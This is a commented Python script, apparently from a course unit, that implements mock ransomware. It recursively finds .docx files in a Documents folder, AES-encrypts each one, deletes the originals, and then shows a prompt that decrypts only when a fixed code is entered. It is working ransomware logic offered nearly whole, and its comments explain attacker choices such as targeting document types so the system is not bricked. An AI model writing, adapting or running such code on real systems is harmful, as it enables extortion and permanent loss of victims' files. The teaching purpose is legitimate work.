# This script encrypts data; could be used in a ransomware attack.

from pathlib import Path
# pathlib is one of Python's libraries for filesystem manipulation.
from Crypto.Cipher import AES
import os

key = b"Sixteen byte key"
iv = os.urandom(16)
def encrypt(data):
    cipher = AES.new(key,AES.MODE_CBC,iv)
    return cipher.encrypt(data)
    
def decrypt(data): 
    cipher = AES.new(key,AES.MODE_CBC,iv)
    return cipher.decrypt(data)
# These two functions are explained in Unit 12.

def encryptFile(path):
    with open(str(path),"rb") as f:
        data = f.read()
        # Reads each file from getFiles() call below as binary code.
    with open(str(path)+".encrypted","wb") as f:
        f.write(encrypt(data))
        # Encrypts the data as new binary file with ".encrypted" ext appended using encrypt().
    os.remove(str(path))
    # Then remove the unencrypted (original) file...evil!

def decryptFile(path):
    with open(str(path)+".encrypted","rb") as f:
        data = f.read()
    with open(str(path),"wb") as f:
        f.write(decrypt(data))
    os.remove(str(path)+".encrypted")
# This simply reverses the process of encryptFile(); it is in the hands of the attacker, because only they have the key and IV.

def getFiles(directory,ext):
    paths = list(Path(directory).rglob("*"+ext))
    return paths
    # Returns a list of filepaths to specified filetypes (.docx in this example).
    # rglob() is basically a Regex function from Python's Path subunit of its library pathlib.


directory = os.path.join(os.getcwd(),"Documents")
# Specify the folder you was to work in; this one is hypothetial, any will do.
print(directory)
ext = ".docx"
# It is common in ransomware attacks that filetypes are specified, because encryption on system files will brick the system.
paths = getFiles(directory,ext)
for path in paths:
    encryptFile(path)
    # Iterates over every file of specified type in specified library and encrypts it.

while(True):
    print("Enter decryption code: ")
    code = input().rstrip()
    if code == "Decrypt files":
        for path in paths:
            decryptFile(path)
        break
# This block is the mock ransomware prompt to input the decryption code, "Decrypt files" in the correct format, and decrypt.
